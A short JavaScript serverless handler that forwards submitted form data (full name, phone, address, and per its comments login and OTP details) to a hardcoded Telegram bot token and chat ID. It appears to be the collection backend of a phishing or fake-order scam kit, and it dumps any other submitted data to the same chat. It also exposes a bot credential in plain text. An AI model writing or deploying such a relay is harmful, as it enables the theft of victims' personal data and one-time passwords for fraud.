export default async function handler(req, res) {
  // Sirf POST request allow karein
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const data = req.body;

    // Aap apne Telegram Bot ka Token aur Chat ID yahan direct rakh sakte hain 
    // ya Vercel Environment Variables me set kar sakte hain (process.env.BOT_TOKEN)
    const BOT_TOKEN = "8691554314:AAHLaryhy3JvzsmkYCaYbOpVdt8ivu0ygMg"; 
    const CHAT_ID = "6165279206";

    let telegramMessage = "";

    // Check karein ki request kis type ki hai (Address Order ya Login/OTP)
    if (data.type === 'order') {
      telegramMessage = 
        `📦 <b>New Order Address Received!</b>\n\n` +
        `👤 <b>Name:</b> ${data.fullname}\n` +
        `📱 <b>Phone:</b> +91 ${data.phone}\n` +
        `📮 <b>Pincode:</b> ${data.pincode}\n` +
        `🏙️ <b>City:</b> ${data.city}\n` +
        `🗺️ <b>State:</b> ${data.state}\n` +
        `🏠 <b>Address:</b> ${data.address}`;
    } else {
      // General fallback message agar koi aur data aaye
      telegramMessage = `🔔 <b>Data Received:</b>\n<pre>${JSON.stringify(data, null, 2)}</pre>`;
    }

    // Telegram API ko request bhejna
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: telegramMessage,
        parse_mode: 'HTML'
      })
    });

    const result = await response.json();

    if (result.ok) {
      return res.status(200).json({ success: true });
    } else {
      return res.status(400).json({ error: 'Failed to send to Telegram' });
    }

  } catch (err) {
    console.error('API Error:', err);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
}
